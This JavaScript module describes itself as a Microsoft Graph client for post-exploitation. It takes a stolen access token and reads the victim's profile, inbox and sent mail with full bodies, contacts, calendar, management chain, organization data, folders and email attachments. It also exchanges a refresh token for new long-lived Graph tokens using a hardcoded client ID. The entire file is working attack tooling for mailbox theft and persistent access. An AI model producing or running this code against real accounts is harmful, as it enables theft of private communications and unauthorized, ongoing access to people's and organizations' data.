// graph_api.js - Microsoft Graph Client for Post-Exploitation
const axios = require('axios');

class GraphClient {
    constructor(accessToken) {
        this.accessToken = accessToken;
        this.baseUrl = 'https://graph.microsoft.com/v1.0';
        this.headers = {
            'Authorization': `Bearer ${accessToken}`,
            'Content-Type': 'application/json'
        };
    }

    async get(endpoint) {
        const response = await axios.get(`${this.baseUrl}${endpoint}`, { headers: this.headers });
        return response.data;
    }

    async post(endpoint, data) {
        const response = await axios.post(`${this.baseUrl}${endpoint}`, data, { headers: this.headers });
        return response.data;
    }

    // ---- Reconnaissance Methods ----
    async getUserProfile() {
        return this.get('/me');
    }

    async getInbox(limit = 50) {
        return this.get(`/mailFolders/inbox/messages?$top=${limit}&$select=subject,sender,toRecipients,bodyPreview,body,receivedDateTime,hasAttachments`);
    }

    async getSentItems(limit = 50) {
        return this.get(`/mailFolders/sentitems/messages?$top=${limit}&$select=subject,sender,toRecipients,bodyPreview,body,receivedDateTime`);
    }

    async getContacts() {
        return this.get('/contacts?$select=displayName,jobTitle,department,emailAddresses');
    }

    async getEvents() {
        return this.get('/events?$select=subject,start,end,attendees,location,bodyPreview');
    }

    async getManager() {
        try { return await this.get('/manager'); } catch (e) { return null; }
    }

    async getDirectReports() {
        try { return await this.get('/directReports'); } catch (e) { return null; }
    }

    async getOrganization() {
        try { return await this.get('/organization'); } catch (e) { return null; }
    }

    async getMailFolders() {
        return this.get('/mailFolders');
    }

    async getMessagesByFolder(folderId, limit = 250) {
        return this.get(`/mailFolders/${folderId}/messages?$top=${limit}&$select=subject,sender,toRecipients,body,bodyPreview,receivedDateTime,attachments`);
    }

    async getEmailAttachments(messageId) {
        return this.get(`/messages/${messageId}/attachments`);
    }

    // ---- Token Exchange ----
    async exchangeRefreshToken(refreshToken, clientId = '3ce82761-cb43-493f-94bb-fe444b7a0cc4') {
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                client_id: clientId,
                refresh_token: refreshToken,
                grant_type: 'refresh_token',
                scope: 'https://graph.microsoft.com/.default offline_access'
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        return response.data;
    }
}

module.exports = GraphClient;
